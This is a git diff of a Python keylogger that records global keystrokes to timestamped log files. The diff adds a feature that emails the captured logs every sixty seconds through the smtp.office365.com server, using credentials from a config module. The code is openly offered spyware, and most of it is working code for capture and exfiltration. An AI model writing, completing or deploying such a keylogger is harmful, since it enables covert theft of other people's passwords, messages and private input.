@@ -1,13 +1,17 @@
-
 """ This module allows you to take complete control of your keyboard,
  hook global events, register hotkeys, simulate key presses,
  and much more."""
+import smtplib
 
+from config import EMAIL_ADDRESS
+from config import EMAIL_PASSWORD
 # importing keyboard module
-from datetime import datetime # for getting the current time
+from datetime import datetime  # for getting the current time
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 # initializing the variables
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
 
 # creating the keylogger
@@ -27,7 +31,7 @@ class Keylogger:
         # name of the key
         name = event.name
         # if length of key is one, then using uppercase
-        if len(name) > 1 :
+        if len(name) > 1:
             if name == "space":
                 # " " instead of "space"
                 name = " "
@@ -44,13 +48,14 @@ class Keylogger:
         self.log += name
 
     """
-    The update_filename() method is simple; we take the recorded datetimes
+    The update_filename() method is simple; we take the recorded date times
      and convert them to a readable string. After that, we construct a filename
       based on these dates, which we'll use for naming our logging files.
     
     The report_to_file() method creates a new file with the name 
     of self.filename, and saves the key logs there.
     """
+
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
         start_dt_str = str(self.start_dt)[:19].replace(" ", "-").replace(":", "")
@@ -63,3 +68,47 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+
+    """
+    The prepare_mail() method takes the message as a regular Python string and constructs 
+    a MIMEMultipart object that helps us make both an HTML and a text version of the mail.
+
+    We then use the prepare_mail() method in sendmail() to send the email. 
+    Notice we have used the Office365 SMTP servers to log in to our email account. 
+    If you're using another provider, make sure you use their SMTP servers. 
+
+    In the end, we terminate the SMTP connection and print a simple message.
+    """
+    def prepare_mail(self, message):
+        """Utility function to construct a MIMEMultipart from a text
+                It creates an HTML version as well as text version
+                to be sent as an email"""
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger logs"
+
+        html = f"<p>{message}</p>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+
+        return msg.as_string()
+
+    def sendmail(self, email, password, message, verbose=1):
+        # manages a connection to an SMTP server
+        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        server = smtplib.SMTP(host="smtp.office365.com", port = 587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message after preparation
+        server.sendmail(email, email, self.prepare_mail(message))
+        # terminates the session
+        server.quit()
+
+        if verbose:
+            print(f"{datetime.now()} -Sent an email to {email} containing : {message}")
+
